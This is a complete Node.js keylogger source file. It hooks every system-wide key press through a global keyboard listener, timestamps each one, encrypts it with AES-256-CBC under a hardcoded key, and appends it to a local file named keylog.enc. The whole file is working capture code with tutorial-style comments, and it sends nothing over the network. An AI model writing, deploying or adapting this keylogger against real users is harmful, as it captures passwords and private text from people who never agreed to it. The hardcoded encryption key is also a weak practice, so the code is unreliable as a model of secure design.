// Importing fs (file system) to write/read to/from file
const fs = require("fs");
// Importing crypto to perform encryption and description
const crypto = require("crypto");
// Importing path to know the file path
const path = require("path");
// This Nodejs library helps in listening the keystrokes
const { GlobalKeyboardListener } = require("node-global-key-listener");

// Basic setup for encryption, such as encryption key, algorithm name, and Initialization vector length
// Ensure the encryption key is exactly 32 bytes long
const ENCRYPTION_KEY = crypto
  .createHash("sha256")
  .update("super-secure-key90890")
  .digest("hex")
  .slice(0, 32);
const ALGORITHM = "aes-256-cbc"; // AES encryption algorithm
const IV_LENGTH = 16; // Initialization vector length for AES-256-CBC

// Creating the path where logged file will be stored
const logFilePath = path.join(__dirname, "keylog.enc");

// Initialize serial number, to insert in front of each line
let serialNumber = 1;

// Function to encrypt data
function encryptData(data) {
  const iv = crypto.randomBytes(IV_LENGTH); // Generate random IV
  const cipher = crypto.createCipheriv(
    ALGORITHM,
    Buffer.from(ENCRYPTION_KEY, "utf-8"),
    iv
  );
  let encrypted = cipher.update(data, "utf-8", "hex");
  encrypted += cipher.final("hex");

  // Return IV and encrypted data together (IV is needed for decryption)
  return iv.toString("hex") + ":" + encrypted;
}

// Function to log encrypted keystrokes to keylog.enc
function logKeystroke(key) {
  const timestamp = formatDateTime(new Date());
  const keyData = `Serial: ${serialNumber}, Key: ${key}, Timestamp: ${timestamp}\n`;

  // Encrypt the keystroke data
  const encryptedData = encryptData(keyData);

  // Append encrypted data to the log file
  fs.appendFileSync(logFilePath, encryptedData + "\n", "utf8");

  // Increment serial number for next keypress
  serialNumber++;
}

// Initialize the Global Keyboard Listener
const gkl = new GlobalKeyboardListener();

// Listener to capture "keydown" events
gkl.addListener((event) => {
  if (event.state === "DOWN") {
    // Log the keypress (encrypted)
    logKeystroke(event.name);
  }
});

// Function to format Time in DD/MM/YYYY, HH:MM:SS format (optional)
function formatDateTime(date) {
  const day = String(date.getDate()).padStart(2, "0");
  const month = String(date.getMonth() + 1).padStart(2, "0");
  const year = date.getFullYear();

  const hours = String(date.getHours()).padStart(2, "0");
  const minutes = String(date.getMinutes()).padStart(2, "0");
  const seconds = String(date.getSeconds()).padStart(2, "0");

  return `${day}/${month}/${year}, ${hours}:${minutes}:${seconds}`;
}

console.log(
  "Keylogger is running... Press keys and they will be logged securely in an encrypted file."
);
